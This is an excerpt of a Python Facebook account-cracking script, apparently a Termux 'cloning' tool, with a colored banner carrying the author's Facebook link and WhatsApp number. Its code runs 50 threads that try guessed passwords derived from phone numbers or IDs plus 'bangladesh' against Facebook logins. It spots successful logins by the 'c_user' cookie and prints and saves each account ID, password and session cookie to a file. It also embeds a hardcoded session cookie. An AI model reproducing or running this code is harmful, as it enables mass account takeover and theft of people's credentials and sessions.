...
\033[1;33m╚════════════════════════════════════════════════╝""")                                         
  ...
  os.system('xdg-open https://www.facebook.com/profile.php?id=100076651960229&mibextid=ZbWKwL')
  print("");time.sleep(2)
...
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92m𝐉𝐀𝐇𝐈𝐃 𝐒𝐇𝐄𝐈𝐊𝐇 ( 𝐌 )  \033[38;5;46m           ▇▎  
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \033[38;5;196m: \033[1;92m+𝟖𝟖𝟎𝟏957550919 \033[38;5;46m                  ▇▎
...
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐕𝐞𝐫𝐬𝐢𝐨𝐧   \033[38;5;196m: \033[1;92m 1.𝟎.𝟏 \033[1;92m𝐔𝐥𝐭𝐫𝐚 \033[38;5;46m                    ▇▎           
...
def cek_apk(session,coki):
	...
	sop = BeautifulSoup(w,"html.parsjer")
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100076651960229&mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='3':
...
def x():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			ps2 = uid[5:]
			ps3 = uid[4:]
			pwx = [uid,ps1,ps2,ps3,'bangladesh']
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[JAHID UL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(cps))),
            sys.stdout.flush()
            ...
            'cookie': 'datr=a9v7Y_t202w1usD_4gFkd7I-; sb=a9v7Y5mzj2Ay7a7_zfzatSnM; m_pixel_ratio=2.75; locale=en_US; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZidVZwaU8tWDdoOV80UHJSbC1XUHc2dWp5Y0xzd1VCUnpRU1gzQVJwNGk3d0t6SGVadUsyU0Z3b0V6N3QwdUwtZyIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZmJ1VnBpTy1YN2g5XzRQclJsLVdQdzZ1anljTHN3VUJSelFTWDNBUnA0aTd3S3pIZVp1SzJTRndvRXo3dDB1TC1nIiwicyI6Im0ifQ%3D%3D; wd=980x1913; dnonce=AWkpQMC39d62ZqZ_bz9aGoEgcaH3cXjVoH2me6Twbzq9JdRvTUJl_dsKZ7L5M0Kmy3pWdwIY3tSofVtF7QAQvS7r; fr=0PWpOGKcJUDKnaLwQ.AWUqXnTc9kOoy9zUYaS4lONwG_I.Bj-9tr.Vn.GQB.0.0.BkAZHD.AWV9xohhqXg',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[JAHID UL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJAHID UL\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [JAHID >OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [🔢] Number : {uid}')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/JAHID -OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
